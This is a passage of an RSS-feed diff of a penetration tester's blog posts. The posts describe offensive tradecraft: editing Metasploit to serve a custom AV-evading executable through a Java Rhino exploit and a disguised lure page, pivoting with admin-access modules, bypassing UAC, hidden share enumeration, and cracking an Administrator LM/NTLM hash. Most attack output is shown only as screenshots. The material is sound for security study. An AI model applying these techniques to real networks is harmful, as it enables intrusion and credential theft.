+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103321.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is probably a better regex for selecting only Java user-agents, but this worked for now, and I don&amp;rsquo;t think any browsers actually use &amp;ldquo;Java&amp;rdquo; in their user-agents. (UPDATE: Searching for &amp;ldquo;site:useragentstring.com java&amp;rdquo; on google only yielded Java, and YACYBOT, which is built on java as using the string &amp;ldquo;Java&amp;rdquo; in their agents)&lt;/p&gt;
+
+&lt;p&gt;You can also notice that I&amp;rsquo;ve whitelisted webex.com and java.com sites and subdomains so that my &amp;ldquo;users&amp;rdquo; won&amp;rsquo;t get blocked using the tools on those sites. This could be pretty hefty with (as phoobar said) a Java dev group. But after the initial push and getting a semi &amp;ldquo;required&amp;rdquo; list of external approved sites this list shouldn&amp;rsquo;t need much upgrading, even for large organizations.&lt;/p&gt;
+
+&lt;p&gt;Save the config and let&amp;rsquo;s see how this works out:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103413.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, but did the attacker still get a shell?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103419.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nope! Win!&lt;/p&gt;
+
+&lt;p&gt;Just to prove that HTTPS isn&amp;rsquo;t fixed here lets set those options up in Metasploit and kick the same exploit:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105028.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And after an error about a self-signed cert (notice the SSLCert option in Metasploit that has the ability to solve that as well) we get the expected result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105054.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And subsequent shell without any indication in Squid&amp;rsquo;s proxy logs of a Java user-agent:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105135.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That&amp;rsquo;s it, sort of a long post but hopefully something that people can use. Thanks!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt; I&amp;rsquo;m not exactly certain how this affects Java &amp;ldquo;Web Start&amp;rdquo; weblet exploits if at all.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Compile NFSShell on Ubuntu</title>
+      <link>http://localhost:1313/post/2013/2013222compile-nfsshell-on-ubuntu-html/</link>
+      <pubDate>Fri, 22 Feb 2013 20:36:02 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013222compile-nfsshell-on-ubuntu-html/</guid>
+      <description>&lt;p&gt;This is here because I always forget how to do it&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;sudo apt-get install libtirpc-dev libncurses-dev&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;wget &lt;a href=&#34;http://www.cs.vu.nl/pub/leendert/nfsshell.tar.gz&#34;&gt;http://www.cs.vu.nl/pub/leendert/nfsshell.tar.gz&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;tar zxvf nfsshell.tar.gz&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;cd nfs&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;ln -s /usr/include/tirpc/rpc/clnt_soc.h /usr/include/rpc/clnt_soc.h&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;perl -p -i.orig -e &amp;rsquo;s/getline/getline_nfs/&amp;rsquo; nfs.c&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Next part I don&amp;rsquo;t have a good way to automate. You need to go in and comment out (w/ #) the 4 lines following &amp;ldquo;uncomment the following 4 lines for Solaris 2.x&amp;rdquo; and uncomment the 2 lines following &amp;ldquo;For GNU readline support you need to add&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;After that a simple &amp;ldquo;make&amp;rdquo; should get you ./nfs sitting there for your use.&lt;/p&gt;
+
+&lt;p&gt;Will probably make a repo out of this so I don&amp;rsquo;t have to keep doing it..&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>ShmooCon 2013 Streaming</title>
+      <link>http://localhost:1313/post/2013/2013/2/14/shmoocon-2013-streaming/</link>
+      <pubDate>Fri, 15 Feb 2013 04:11:29 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013/2/14/shmoocon-2013-streaming/</guid>
+      <description>&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/spatial_d&#34;&gt;@spatial_d&lt;/a&gt; for the tweet here: &lt;a href=&#34;https://twitter.com/spatial_d/status/302253050725298176&#34;&gt;https://twitter.com/spatial_d/status/302253050725298176&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;m capturing it here more of a bookmark for myself:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Build It: &lt;a href=&#34;http://www.ustream.tv/channel/build-it-2013&#34;&gt;http://www.ustream.tv/channel/build-it-2013&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Belay It: &lt;a href=&#34;http://www.ustream.tv/channel/belay-it-2013&#34;&gt;http://www.ustream.tv/channel/belay-it-2013&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Bring It On: &lt;a href=&#34;http://www.ustream.tv/channel/bring-it-2013&#34;&gt;http://www.ustream.tv/channel/bring-it-2013&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Delete TrustedInstaller-only Files and Folders</title>
+      <link>http://localhost:1313/post/2012/20121224delete-trustedinstaller-only-files-and-folders-html/</link>
+      <pubDate>Mon, 24 Dec 2012 06:55:17 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121224delete-trustedinstaller-only-files-and-folders-html/</guid>
+      <description>&lt;p&gt;Not very security related, but something I don&amp;rsquo;t want to forget how to do. It was a PITA. So I had a old WINDOWS directory that I needed to get rid of. And the following commands gave me the ooomph needed to get the job done.&lt;/p&gt;
+
+&lt;p&gt;1) Get a SYSTEM shell so all modding of permissions will be good.&lt;/p&gt;
+
+&lt;p&gt;D:&amp;gt; &lt;strong&gt;psexec /accepteula -s cmd&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;2) Grant Administrators FULL rights to the directory and all sub directories and files&lt;/p&gt;
+
+&lt;p&gt;D:&amp;gt; &lt;strong&gt;icacls D:Windows* /grant Administrators:F /C /T&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;3) Finish the job, delete the folder and everything below it&lt;/p&gt;
+
+&lt;p&gt;D:&amp;gt;** rmdir /s /q D:Windows**&lt;/p&gt;
+
+&lt;p&gt;All done. Weeeeeeeee!&lt;/p&gt;
+
+&lt;p&gt;If you have a better way to do this via commands or programs please let me know, always looking to learn more.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>EXE::Custom in Metasploit&#39;s Java Exploits</title>
+      <link>http://localhost:1313/post/2012/20121119execustom-in-metasploits-java-exploits-html/</link>
+      <pubDate>Mon, 19 Nov 2012 05:59:10 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121119execustom-in-metasploits-java-exploits-html/</guid>
+      <description>&lt;p&gt;Let me say first off that this isn&amp;rsquo;t the most elegant of ways to accomplish it. It is in the &amp;ldquo;it works for me&amp;rdquo; stage.&lt;/p&gt;
+
+&lt;p&gt;A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost. If you don&amp;rsquo;t have a handler set up to catch whatever is in your EXE and you have bogus information in your payload settings for your module, Metasploit won&amp;rsquo;t be able to magically determine what you want it to do. So make sure that you either have the payload settings correct (even though it won&amp;rsquo;t use them for the exploit) or set the option &amp;ldquo;DisablePayloadHandler&amp;rdquo; to true and start your own handler somewhere else.&lt;/p&gt;
+
+&lt;p&gt;With that said, the Java Signed Applet attack is one of the most widely used, one problem in the Metasploit module version is that you have no external control (such as EXE::Custom) for the binary that is dropped if you are using a Windows native payload. (I do highly recommend trying out Java Meterpreter, but that it for another post)&lt;/p&gt;
+
+&lt;p&gt;Here is the hack that gets me by until a more elegant solution is thought up by smarter people than I:&lt;/p&gt;
+
+&lt;p&gt;We are going to use the Java Rhino exploit, and this story starts with an undetectable.exe sitting in /tmp/ - How you bypass the AV you are up against is up to you. The first thing we need to do is make a core library change. Yes, this is as scary as it sounds and you should document any time you do so you can revert as needed.&lt;/p&gt;
+
+&lt;p&gt;In your MSF directory open up lib/msf/util/exe.rb - should look something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_67.png&#34; alt=&#34;Capture 67&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Scroll down or search for &amp;ldquo;self.to_jar&amp;rdquo; - should look something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_68.png&#34; alt=&#34;Capture 68&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now add &amp;ldquo;exe = File.read(&amp;lsquo;/path/to/your/evil.exe&amp;rsquo;) as demonstrated below:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_69.png&#34; alt=&#34;Capture 69&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool. We&amp;rsquo;ve made our change, now we have to pull down a jar generated with our evil bin, and the Rhino exploit. We can do that by spinning up Metasploit with our newly editing core library. Load up the Rhino exploit via &amp;ldquo;use exploit/multi/browser/java_rhino&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_71.png&#34; alt=&#34;Capture 71&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One trip up that I messed up even just creating this blog post (and a constant headache in the #Metasploit channel on Freenode) is forgetting to set the TARGET variable in Java exploits. The default payload type being Java. Since we are using a native windows binary we need to specify Windows by setting TARGET 1.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_82.png&#34; alt=&#34;Capture 82&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Run the exploit with any settings, since we&amp;rsquo;ll be just pulling out what we need. Then pull down the exploit JAR file with wget:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_73.png&#34; alt=&#34;Capture 73&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(Most java exploits are set to answer ANY .jar extension request with the payload.)&lt;/p&gt;
+
+&lt;p&gt;The HTML to load the JAR is pretty straight forward, but if you&amp;rsquo;ve never seen it before here it is:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_74.png&#34; alt=&#34;Capture 74&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats it. A very blank page with an exploit in it. We can do better than that:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_75.png&#34; alt=&#34;Capture 75&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Obviously you can do whatever you want with the HTML, mirror a site or what have you. Notice that I&amp;rsquo;ve also changed the name of the JAR. (You can&amp;rsquo;t change the class unless you start making changes to the exploit directly and I wanted to keep this as generically applicable as possible)&lt;/p&gt;
+
+&lt;p&gt;Move the Applet.jar to SuperMario.jar and start up a Web server (for demo using Python&amp;rsquo;s awesome SimpleHTTPServer, but apache will serve as well)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_79.png&#34; alt=&#34;Capture 79&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don&amp;rsquo;t forget to start up a handler for our now-external exploit:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_80.png&#34; alt=&#34;Capture 80&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Victim views the site:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_81.png&#34; alt=&#34;Capture 81&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And WA-LA! we haz shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/11/capture_83.png&#34; alt=&#34;Capture 83&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yay… Game over..&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Smash and Grab: Windows Dir Lists</title>
+      <link>http://localhost:1313/post/2012/20121113smash-and-grab-windows-dir-lists-html/</link>
+      <pubDate>Tue, 13 Nov 2012 08:44:47 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121113smash-and-grab-windows-dir-lists-html/</guid>
+      <description>&lt;p&gt;Looking through network shares can be slow, and waiting for individual searches to finish looking through the whole &amp;ldquo;drive&amp;rdquo; is redundant. Easier to just use some Windows voodoo to get a good list to look through offline:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;start /b cmd /c dir /b /s \doesnotexistsupersecretshare$ ^&amp;gt; shareinfo.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Breaking that down:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;start /b&lt;/strong&gt; - starts a process that won&amp;rsquo;t hang up our current one, with the &amp;ldquo;b&amp;rdquo; flag meaning &amp;ldquo;background&amp;rdquo;, yay not visible to the user! (unless your process forces it back)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;cmd /c&lt;/strong&gt; - no reason to explain this one it runs something.. (since dir isn&amp;rsquo;t an executable but something that resides inside of cmd this is needed)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;dir /b /s&lt;/strong&gt; - the &amp;ldquo;s&amp;rdquo; means sub directories and pretty widely known. The one that isn&amp;rsquo;t as well known is the &amp;ldquo;b&amp;rdquo; which means &amp;ldquo;bare&amp;rdquo; format. Also known as &amp;ldquo;puts-path-on-every-line-to-make-it-easy-to-find-and-grep-stuff&amp;rdquo; mode.&lt;/p&gt;
+
+&lt;p&gt;The path is arbitrary, if you didn&amp;rsquo;t know you could dir list a UNC path, now ya do.&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;^&amp;gt;&lt;/strong&gt; is the cool trick. If you use &amp;ldquo;start&amp;rdquo; to create a process in the background, re-routing its output to a file instead of just getting the fact that start began (the only thing start outputs), is made possible by this lowly &amp;lsquo;carrot&amp;rsquo; before the greater-than.&lt;/p&gt;
+
+&lt;p&gt;And that&amp;rsquo;s it. With big drives, come back in an hour or two and you&amp;rsquo;ll have a perfectly grep-able file waiting for you to grep through for file names and extensions to your heart&amp;rsquo;s content.&lt;/p&gt;
+
+&lt;p&gt;One caveat, don&amp;rsquo;t freak out if it&amp;rsquo;s been 30 minutes and the file size is still ZERO. It doesn&amp;rsquo;t write the output until the end, it write buffered in the process and then &amp;ldquo;start&amp;rdquo; pulls it back out at the end with the carrot.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Finding Admin Access</title>
+      <link>http://localhost:1313/post/2012/20121030finding-admin-access-html/</link>
+      <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121030finding-admin-access-html/</guid>
+      <description>&lt;p&gt;You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;
+
+&lt;p&gt;(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;
+
+&lt;p&gt;Enter the auxiliary module:  &lt;strong&gt;auxiliary/admin/smb/check_dir_file&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;First we set up a route as aux modules don&amp;rsquo;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_49.png&#34; alt=&#34;Capture 49&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Use the module and set our credentials:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_50.png&#34; alt=&#34;Capture 50&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, set ADMIN$ as we can&amp;rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_51.png&#34; alt=&#34;Capture 51&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A simple &amp;lsquo;run&amp;rsquo; and away it goes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_52.png&#34; alt=&#34;Capture 52&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we can see that our lowly user that doesn&amp;rsquo;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;
+
+&lt;p&gt;=============================================================================&lt;/p&gt;
+
+&lt;p&gt;The rest of this has nothing to do about admin access, just some tricks to do it better&lt;/p&gt;
+
+&lt;p&gt;=============================================================================&lt;/p&gt;
+
+&lt;p&gt;As many of you know I&amp;rsquo;m not a huge fan of sending packets I don&amp;rsquo;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;
+
+&lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;
+
+&lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_53.png&#34; alt=&#34;Capture 53&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_54.png&#34; alt=&#34;Capture 54&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;
+
+&lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;
+
+&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&amp;rsquo;t add the hosts to the MSF database]&lt;/p&gt;
+
+&lt;p&gt;Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_55.png&#34; alt=&#34;Capture 55&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(We still have our route set up so this is module is going through our low privilege user still)&lt;/p&gt;
+
+&lt;p&gt;And now we have info in the DB for better targeting:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_56.png&#34; alt=&#34;Capture 56&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&amp;rsquo;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;
+
+&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&amp;rsquo;t have many hosts):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_58.png&#34; alt=&#34;Capture 58&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&amp;rsquo;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;
+
+&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&amp;rsquo;t involve traditional scanning (smb_version is the only thing that comes close). And we&amp;rsquo;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&amp;rsquo;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>BypassUAC got a facelift</title>
+      <link>http://localhost:1313/post/2012/20121030bypassuac-got-a-facelift-html/</link>
+      <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121030bypassuac-got-a-facelift-html/</guid>
+      <description>&lt;p&gt;Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;Old&amp;rdquo; module (post/windows/escalate/bypassuac):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-03-1020pm.png.10%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 03 10 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I decided to give it a bit of a face lift:&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;New&amp;rdquo; local exploit module (exploit/windows/local/bypassuac):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-07-1020pm.png.10%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 07 10 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.&lt;/p&gt;
+
+&lt;p&gt;Anywho, on to the new features:&lt;/p&gt;
+
+&lt;p&gt;1) You can set any windows payload you want to use now:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-38-1920pm.png.19%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 38 19 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and yes it supports EXE::Custom.&lt;/p&gt;
+
+&lt;p&gt;2) It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-40-1520pm.png.15%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 40 15 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Even when you&amp;rsquo;re going overkill with it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-3020at203-41-3120pm.png.31%20PM.png&#34; alt=&#34;Screen Shot 2012 10 30 at 3 41 31 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(ASK module if UAC is disabled will just elevate without any kind of user prompt)&lt;/p&gt;
+
+&lt;p&gt;And of course it works as expected if UAC needs bypassing:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_47.png&#34; alt=&#34;Capture 47&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&amp;rsquo;t, then you&amp;rsquo;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/capture_48.png&#34; alt=&#34;Capture 48&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>lm2ntlm with John the Ripper</title>
+      <link>http://localhost:1313/post/2012/20121024lm2ntlm-with-john-the-ripper-html/</link>
+      <pubDate>Wed, 24 Oct 2012 15:03:58 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2012/20121024lm2ntlm-with-john-the-ripper-html/</guid>
+      <description>&lt;p&gt;Since I didn&amp;rsquo;t see any documentation bringing how to take an LM hash that you&amp;rsquo;ve cracked and convert it to the NTLM equivalent all in one place. And I google how to do it almost every time. I wanted to put all these links in one place and remember how to do it for john. Go-go-gadget blog-notes.&lt;/p&gt;
+
+&lt;p&gt;So there is this: &lt;a href=&#34;https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp&#34;&gt;https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And this: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And this: &lt;a href=&#34;http://www.securityfocus.com/tools/6696&#34;&gt;http://www.securityfocus.com/tools/6696&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And the edited version of the above: &lt;a href=&#34;http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/&#34;&gt;http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;But Metasploit&amp;rsquo;s is currently &lt;a href=&#34;http://dev.metasploit.com/redmine/issues/7351&#34;&gt;borked&lt;/a&gt;,(&lt;strong&gt;Update: this is now fixed&lt;/strong&gt;) I don&amp;rsquo;t want to compile cpp, and perl sucks. One thing I did find was that someone submitted it to the JtR dev mailing list here:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2011/03/29/7&#34;&gt;http://www.openwall.com/lists/john-dev/2011/03/29/7&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And I asked on that same list what had become of it:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/2&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/2&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The result is as follows:&lt;/p&gt;
+
+&lt;p&gt;Given this hash: Administrator:500:AA1AB12D9BE8C0D18F900ABF62624751:A2855453E8F6E555E5F22956F7DAA398:::&lt;/p&gt;
+
+&lt;p&gt;which is the LM and NTLM equiv of SUPERPASSWORD/SuPerPaSsWord respectively. So just so I don&amp;rsquo;t have to make a screen shot of a text file assume that hash exactly as-is is in pwdump.txt.&lt;/p&gt;
+
+&lt;p&gt;[](&lt;a href=&#34;http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ee4b0b79cd4cd3c3d/1351091037123/Windows-Live-Writer-lm2ntlm-with_846B-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ee4b0b79cd4cd3c3e/1351091037055/Windows-Live-Writer-lm2ntlm-with_846B-&#34;&gt;http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ee4b0b79cd4cd3c3d/1351091037123/Windows-Live-Writer-lm2ntlm-with_846B-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ee4b0b79cd4cd3c3e/1351091037055/Windows-Live-Writer-lm2ntlm-with_846B-&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;cracked the LM side in 16 seconds. Now you don&amp;rsquo;t need to use John to get the LM side (rainbow tables work better at times),&lt;/p&gt;
+
